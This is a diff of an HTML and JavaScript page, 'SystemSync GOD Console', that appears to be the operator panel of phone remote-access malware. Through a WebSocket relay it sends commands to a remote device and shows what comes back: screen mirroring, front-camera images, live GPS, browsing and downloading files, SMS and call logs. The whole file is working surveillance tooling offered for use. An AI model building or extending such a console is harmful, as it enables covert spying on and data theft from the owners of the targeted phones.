@@ -4,47 +4,379 @@
     <title>SystemSync GOD Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* (your existing CSS) */
+        /* ===== GLOBAL ===== */
+        body{
+            margin:0;
+            background:radial-gradient(circle at top,#050505,#000);
+            color:#00f7ff;
+            font-family:Consolas,monospace;
+            display:flex;
+            height:100vh;
+            overflow:hidden;
+        }
+
+        /* ===== SIDEBAR ===== */
+        #sidebar{
+            width:270px;
+            background:linear-gradient(180deg,#020202,#000);
+            border-right:1px solid #00f7ff22;
+            padding:20px;
+            box-shadow:0 0 30px #00f7ff11;
+        }
+
+        .logo{
+            font-size:20px;
+            letter-spacing:3px;
+            margin-bottom:25px;
+            color:#00f7ff;
+        }
+
+        .section{
+            margin-bottom:25px;
+        }
+
+        .section-title{
+            font-size:11px;
+            letter-spacing:2px;
+            color:#00f7ff88;
+            margin-bottom:10px;
+        }
+
+        /* ===== BUTTONS ===== */
+        button{
+            width:100%;
+            padding:10px;
+            margin:6px 0;
+            background:#000;
+            color:#00f7ff;
+            border:1px solid #00f7ff55;
+            border-radius:6px;
+            cursor:pointer;
+            transition:.25s;
+        }
+
+        button:hover{
+            background:#00f7ff;
+            color:#000;
+            box-shadow:0 0 12px #00f7ff;
+        }
+
+        /* ===== MAIN ===== */
+        #main{
+            flex:1;
+            display:flex;
+            flex-direction:column;
+        }
+
+        /* HEADER */
+        #header{
+            height:60px;
+            border-bottom:1px solid #00f7ff22;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            padding:0 25px;
+            background:#020202;
+        }
+
+        .status{
+            padding:5px 14px;
+            border-radius:20px;
+            font-size:12px;
+            border:1px solid #00f7ff55;
+        }
+
+        /* ===== CONTENT ===== */
+        #content{
+            flex:1;
+            display:flex;
+            gap:20px;
+            padding:20px;
+        }
+
+        /* VIDEO PANEL */
+        #video-panel{
+            flex:2;
+            background:#020202;
+            border-radius:12px;
+            border:1px solid #00f7ff33;
+            box-shadow:0 0 40px #00f7ff11 inset;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+
+        video{
+            width:100%;
+            height:100%;
+            object-fit:contain;
+            border-radius:12px;
+        }
+
+        /* DATA PANEL */
+        #data-panel{
+            flex:1;
+            background:#020202;
+            border-radius:12px;
+            border:1px solid #00f7ff33;
+            overflow-y:auto;
+            padding:15px;
+        }
+
+        /* DATA CARD */
+        .card{
+            background:#000;
+            border-left:3px solid #00f7ff;
+            padding:8px;
+            margin-bottom:8px;
+            font-size:12px;
+        }
+
+        /* MAP */
+        #map{
+            height:300px;
+            border-radius:8px;
+        }
     </style>
 </head>
 <body>
-<!-- (your existing HTML layout) -->
+
+<!-- SIDEBAR -->
+<div id="sidebar">
+    <div class="logo">SYSTEMSYNC</div>
+    <div class="section">
+        <div class="section-title">SURVEILLANCE</div>
+        <button onclick="startScreen()">🖥 SCREEN MIRROR</button>
+        <button onclick="send('camFront')">📹 FRONT CAMERA</button>
+        <button onclick="send('getLocation')">📍 LIVE GPS</button>
+    </div>
+    <div class="section">
+        <div class="section-title">DATA</div>
+        <button onclick="send('ls root')">📂 FILE MANAGER</button>
+        <button onclick="send('getSMS inbox')">💬 SMS LOGS</button>
+    </div>
+</div>
+
+<!-- MAIN -->
+<div id="main">
+    <div id="header">
+        <div>GOD CONTROL PANEL</div>
+        <div id="status" class="status">CONNECTING...</div>
+    </div>
+    <div id="content">
+        <div id="video-panel">
+            <video id="remoteVideo" autoplay playsinline></video>
+        </div>
+        <div id="data-panel">
+            <div id="map"></div>
+            <div id="data"></div>
+        </div>
+    </div>
+</div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    const ws = new WebSocket("wss://mirror-view.onrender.com");
+    // ---------- CONFIGURATION ----------
+    const WS_URL = "wss://mirror-view.onrender.com";  // Your Render WebSocket URL
+
+    // ---------- GLOBAL STATE ----------
+    let ws;
     let mapInstance = null;
+    let pc = null;  // WebRTC peer connection (for screen mirror)
 
-    ws.onopen = () => {
-        ws.send("I_AM_WEB");
-        setStatus("ONLINE");
-    };
+    // ---------- CONNECTION ----------
+    function connectWebSocket() {
+        ws = new WebSocket(WS_URL);
 
-    ws.onclose = () => setStatus("OFFLINE");
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            ws.send("I_AM_WEB");
+            setStatus("ONLINE");
+        };
 
-    ws.onmessage = (e) => {
-        const msg = e.data;
-        if (msg.startsWith("STATUS:")) {
-            setStatus(msg.substring(7));
-        } else if (msg.startsWith("LOC_DATA:")) {
-            renderMap(JSON.parse(msg.substring(9)));
-        } else if (msg.startsWith("FILE_LIST:")) {
-            renderFiles(JSON.parse(msg.substring(10)));
-        } else if (msg.startsWith("SMS_DATA:")) {
-            renderLogs(JSON.parse(msg.substring(9)));
-        }
-    };
+        ws.onmessage = (event) => {
+            const msg = event.data;
+            console.log('Received:', msg);
 
-    function send(cmd) { ws.send(cmd); }
+            if (msg.startsWith("STATUS:")) {
+                setStatus(msg.substring(7));
+            }
+            else if (msg.startsWith("LOC_DATA:")) {
+                try {
+                    const data = JSON.parse(msg.substring(9));
+                    renderMap(data);
+                } catch (e) {
+                    console.error('Invalid location data', e);
+                }
+            }
+            else if (msg.startsWith("FILE_LIST:")) {
+                try {
+                    const files = JSON.parse(msg.substring(10));
+                    renderFiles(files);
+                } catch (e) {
+                    console.error('Invalid file list', e);
+                }
+            }
+            else if (msg.startsWith("SMS_DATA:")) {
+                try {
+                    const smsData = JSON.parse(msg.substring(9));
+                    renderLogs(smsData);
+                } catch (e) {
+                    console.error('Invalid SMS data', e);
+                }
+            }
+            else if (msg.startsWith("CAMERA_IMAGE:")) {
+                const base64 = msg.substring(13);
+                displayImage(base64);
+            }
+            else if (msg.startsWith("CALL_DATA:")) {
+                try {
+                    const callData = JSON.parse(msg.substring(10));
+                    renderLogs(callData);
+                } catch (e) {
+                    console.error('Invalid call logs', e);
+                }
+            }
+            else if (msg.startsWith("RTC_OFFER:")) {
+                // For screen mirroring – handle WebRTC offer
+                const offerStr = msg.substring(11); // "screen:{"sdp":...}"
+                // In a real implementation, you'd parse and set remote description
+                console.log('Received RTC offer', offerStr);
+            }
+            else if (msg.startsWith("RTC_ANSWER:")) {
+                const answerStr = msg.substring(11);
+                console.log('Received RTC answer', answerStr);
+                if (pc) {
+                    try {
+                        pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(answerStr)));
+                    } catch (e) {
+                        console.error('Failed to set remote description', e);
+                    }
+                }
+            }
+            else if (msg.startsWith("ICE_CANDIDATE:")) {
+                const candidateStr = msg.substring(14);
+                console.log('Received ICE candidate', candidateStr);
+                if (pc) {
+                    try {
+                        pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
+                    } catch (e) {
+                        console.error('Failed to add ICE candidate', e);
+                    }
+                }
+            }
+        };
 
-    function setStatus(text) {
-        document.getElementById("status").innerText = text;
-        // update colors...
+        ws.onclose = () => {
+            console.log('WebSocket disconnected');
+            setStatus('OFFLINE');
+            setTimeout(connectWebSocket, 5000);
+        };
+
+        ws.onerror = (err) => {
+            console.error('WebSocket error', err);
+        };
     }
 
-    function renderMap(data) { /* ... */ }
-    function renderFiles(files) { /* ... */ }
-    function renderLogs(data) { /* ... */ }
+    // ---------- COMMAND SENDING ----------
+    function send(cmd) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(cmd);
+        } else {
+            alert('Not connected to server');
+        }
+    }
+
+    // ---------- STATUS UI ----------
+    function setStatus(text) {
+        const el = document.getElementById('status');
+        el.innerText = text;
+        el.style.borderColor = text === 'ONLINE' ? '#00ff99' : '#ff4444';
+        el.style.color = text === 'ONLINE' ? '#00ff99' : '#ff4444';
+    }
+
+    // ---------- MAP ----------
+    function renderMap(data) {
+        if (mapInstance) mapInstance.remove();
+        mapInstance = L.map('map').setView([data.lat, data.lon], 18);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy }).addTo(mapInstance);
+    }
+
+    // ---------- FILE BROWSER ----------
+    function renderFiles(files) {
+        const html = files.map(f => `
+            <div class="card">
+                ${f.isDir ? '📁' : '📄'} ${f.name} (${formatBytes(f.size)})
+                <button style="width:auto;float:right" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
+                    ${f.isDir ? 'OPEN' : 'DL'}
+                </button>
+            </div>
+        `).join('');
+        document.getElementById('data').innerHTML = html;
+    }
+
+    function formatBytes(bytes) {
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+    }
+
+    // ---------- SMS / LOGS ----------
+    function renderLogs(data) {
+        const html = data.map(item => 
+            `<div class="card">${JSON.stringify(item, null, 2)}</div>`
+        ).join('');
+        document.getElementById('data').innerHTML = html;
+    }
+
+    // ---------- CAMERA IMAGE DISPLAY ----------
+    function displayImage(base64Image) {
+        const videoPanel = document.getElementById('video-panel');
+        videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
+    }
+
+    // ---------- WEBRTC SCREEN SHARING ----------
+    async function startScreen() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected');
+            return;
+        }
+
+        // Reset video panel
+        document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
+        const videoElement = document.getElementById('remoteVideo');
+
+        // Create peer connection
+        pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+
+        pc.ontrack = (event) => {
+            console.log('Track received');
+            if (event.streams && event.streams[0]) {
+                videoElement.srcObject = event.streams[0];
+            }
+        };
+
+        pc.onicecandidate = (event) => {
+            if (event.candidate) {
+                ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
+            }
+        };
+
+        // Create and send offer
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        ws.send('RTC_OFFER:screen:' + JSON.stringify(offer));
+    }
+
+    // ---------- INIT ----------
+    window.onload = () => {
+        connectWebSocket();
+    };
 </script>
 </body>
 </html>
